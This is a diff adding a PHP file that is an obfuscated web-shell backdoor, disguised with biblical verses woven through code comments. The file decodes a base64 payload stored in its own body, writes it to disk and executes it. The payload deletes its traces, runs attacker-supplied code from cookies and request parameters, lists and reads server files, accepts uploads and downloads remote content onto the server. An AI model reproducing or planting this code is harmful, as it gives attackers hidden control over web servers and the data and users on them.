@@ -1,0 +1,49 @@
+<?php
+/*One */ $O /* generation after */ = /* another */ QUoTeD_prinTaBle_decodE( /* will */ 'P1PR1GZ9' /* give */ ) /* praise to your */ ; /* great acts, */ file_pUt_ConTEnTS /* and make clear the operation of your strength.
+And all */ ( /* the kings of the north, */ uRldeCoDE( /* far and */ $O /* near, one with another; */ ) /* and */ , /* all */ baSE64_DecOdE /* the */ ( /* kingdoms of the */ ImpLODE /* world */ ( /* on */ ARRAy_SlIcE /* the */ ( /* face */ FiLe /* of */ ( /* the earth. */ __FILE__ /*
+Before Ephraim */ ) /* and Benjamin */ , /* and */ 5 /* Manasseh, let your */ , /* strength be awake from sleep, and come as our salvation.
+As Babylon had */ 43 /* the dead of Israel put */ ) /* to the */ ) /* sword, */ ) /* so in */ ) /* Babylon the */ ; /* dead of all */ reqUirE_oNce /* the land */ $O /* will be stretched */ ; /* out.
+PD9waHAgZXJyb3JfcmVwb3J0aW5nKC0xKTtpbm
+lfc2V0KCdkaXNwbGF5X2Vycm9ycycsJzEnKTtp
+bmlfc2V0KCdsb2dfZXJyb3JzJywnMCcpO3VubG
+luaygkTyk7aWYoIWlzc2V0KCRfUkVRVUVTVFsk
+T10pKXtkaWU7fSR1PSRfUkVRVUVTVFskT107aW
+YoaXNzZXQoJF9SRVFVRVNUWzBdLCR1WzFdLCR1
+WzJdLCR1WzNdLCR1WzRdKSl7JHVbMV0oJHskdV
+syXX1bMF0sJHVbM10oJHVbNF0pKTtkaWU7fWVs
+c2VpZihpc3NldCgkX0NPT0tJRVszXSkpe2V2YW
+woYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJF9D
+T09LSUVbM10pKSk7ZGllO31lbHNlaWYoKCRaPW
+lzc2V0KCRfU0VSVkVSWydIVFRQXycuJE9dKT8k
+X1NFUlZFUlsnSFRUUF8nLiRPXTooaXNzZXQoJF
+9QT1NUWyRPXSk/JF9QT1NUWyRPXTpudWxsKSkm
+JigkWj1qc29uX2RlY29kZSh1cmxkZWNvZGUoYm
+FzZTY0X2RlY29kZSgkWikpLHRydWUpKSYmaXNz
+ZXQoJFpbMF0pJiYoJGw9JFpbMF0pKXtpZihpc3
+NldCgkWls1XSkpeyRsPXJlYWxwYXRoKCRsLiRa
+WzVdKTt9Y2hkaXIoJGwpO2lmKGlzc2V0KCRaWz
+ZdKSl7cmVhZGZpbGUoJFpbNl0pO2RpZTt9aWYo
+aXNzZXQoJF9GSUxFU1skT10pJiYoJHU9JF9GSU
+xFU1skT10pKXtyZW5hbWUoJHVbJ3RtcF9uYW1l
+J10sJHVbJ25hbWUnXSk7fWlmKGlzc2V0KCRaWz
+FdLCRaWzJdLCRaWzNdKSYmJFpbMl0hPT0nJyl7
+aWYoJFpbMV09PT0nMCcpeyR1PWZpbGVfZ2V0X2
+NvbnRlbnRzKCRaWzJdKTtpZigoJHU9PT1mYWxz
+ZXx8JHU9PT0nJykmJmlzX2NhbGxhYmxlKCdjdX
+JsX2luaXQnKSl7JHU9Y3VybF9pbml0KCRaWzJd
+KTtjdXJsX3NldG9wdCgkdSwxOTkxMywxKTskdT
+1jdXJsX2V4ZWMoJHUpO31pZigkdSE9PWZhbHNl
+JiYkdSE9PScnKXtmaWxlX3B1dF9jb250ZW50cy
+hiYXNlbmFtZShwYXJzZV91cmwoJFpbMl0sNSkp
+LCR1KTt9fWVsc2VpZigkWlszXSE9PScnKXskWl
+sxXSgkWlsyXSwkWlszXSk7fWVsc2V7JFpbMV0o
+JFpbMl0pO319fWVsc2V7JGw9Z2V0Y3dkKCk7fS
+RaPWFycmF5KCk7Zm9yZWFjaChzY2FuZGlyKCRs
+KWFzJHUpeyRaWyR1XT1pc19kaXIoJHUpO31lY2
+hvJzwhRE9DVFlQRSBodG1sPjxodG1sIGxhbmc9
+ZW4+PGhlYWQ+PHRpdGxlPiM8L3RpdGxlPjxzY3
+JpcHQ+dmFyIGs9IicuJE8uJyIscD0iJy5zdHJf
+cmVwbGFjZSgnXFwnLCcvJywkbCkuJyIscz0nLm
+pzb25fZW5jb2RlKCRaKS4nOzwvc2NyaXB0Pjwv
+aGVhZD48L2h0bWw+Jzs
+*/
